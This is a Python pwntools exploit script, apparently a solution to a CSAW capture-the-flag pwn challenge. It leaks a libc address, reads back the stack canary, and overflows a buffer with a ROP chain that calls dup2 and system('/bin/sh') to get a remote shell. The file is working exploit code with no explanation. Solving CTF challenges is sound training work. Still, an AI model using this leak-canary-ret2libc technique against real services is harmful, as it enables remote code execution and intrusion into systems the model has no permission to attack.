#!/usr/bin/env python
from pwn import *

p = remote('pwn.chal.csaw.io', 8002)

p.sendline('1')

r = 'Reference:0x([0-9a-f]*)\n'
has_puts_leak = p.recvregex(r)
print(has_puts_leak)
puts_leak = int(re.findall(r, has_puts_leak)[0], 16)
print('puts_leak: %x' % (puts_leak,))

libc_base = (puts_leak + 0x500) - 0x0006fd60
print('libc_base: %x' % (libc_base,))

pack = lambda x: __import__('struct').pack('<Q', x)

system = pack(libc_base + 0x00046590)
libc_dup2 = pack(libc_base + 0x000ebe90)
binsh = pack(libc_base + 0x0017c8c3)
rsi = pack(libc_base + 0x0000000000024885)
rdi = pack(libc_base + 0x0000000000022b9a)

# ret2dup2(fd) generates a ropchain for: dup2(fd, stdout); dup2(fd, stdin)
ret2dup2 = lambda fd: rdi+pack(fd)+rsi+pack(1)+libc_dup2 + rdi+pack(fd)+rsi+pack(0)+libc_dup2
# ret2system generates a ropchain for: system("/bin/sh")
ret2system = rdi + binsh + system

p.sendline('2')
p.sendline('ABCD')
has_cookie = []
has_cookie.append(p.recvregex('-Tutorial-'))
has_cookie.append(p.recvregex('-Tutorial-'))
prefix = has_cookie[1][has_cookie[1].index('ABCD'):]

p.sendline('2')

payload = list("A"*0x1cc)
def augment(offset, x):
    global payload
    payload[offset:offset+len(x)] = x
payload[0x138:0x140] = prefix[0x138:0x140]
augment(0x148, ret2dup2(4)+ret2system)

p.send(''.join(payload))

p.interactive()
